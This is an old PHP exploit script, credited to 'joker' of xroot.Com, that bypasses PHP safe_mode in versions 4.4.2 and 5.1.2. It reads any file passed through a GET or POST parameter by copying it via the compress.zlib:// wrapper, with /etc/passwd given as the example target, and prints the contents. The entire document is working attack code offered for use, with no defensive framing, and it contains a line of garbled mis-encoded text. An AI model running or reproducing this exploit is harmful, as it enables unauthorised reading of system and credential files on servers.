<?php
/*
Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
by joker from xroot.Com

*/


$file=""; // File to Include... or use _GET _POST
$tymczas=""; // Set $tymczas to dir where you have 777 like /var/tmp



echo "<PRE>\n";
if(empty($file)){
if(empty($_GET['file'])){
if(empty($_POST['file'])){
die("\nSet varibles \$tymczas, \$file or use for varible file POST, GET like
?file=/etc/passwd\n <B><CENTER><FONT
COLOR=\"RED\">www.xrootz.Com/cc
joker_mtv@yahoo.com <br>Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2 <br> «”ﬂ—»   ŒÿÌ «·”Ì› „Êœ ·«’œ«—Ì «·»Ì « ‘ »Ì «·„“ﬂÊ—Ì‰ «⁄·«Â</FONT></CENTER></B>");
} else {
$file=$_POST['file'];
}
} else {
$file=$_GET['file'];
}
}

$temp=tempnam($tymczas, "cx");

if(copy("compress.zlib://".$file, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "<B>--- Start File ".htmlspecialchars($file)."
-------------</B>\n".htmlspecialchars($tekst)."\n<B>--- End File
".htmlspecialchars($file)." ---------------\n";
unlink($temp);
die("\n<FONT COLOR=\"RED\"><B>File
".htmlspecialchars($file)." has been already loaded. joker Team
;]</B></FONT>");
} else {
die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
<B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
access.</CENTER></FONT>");
}
?>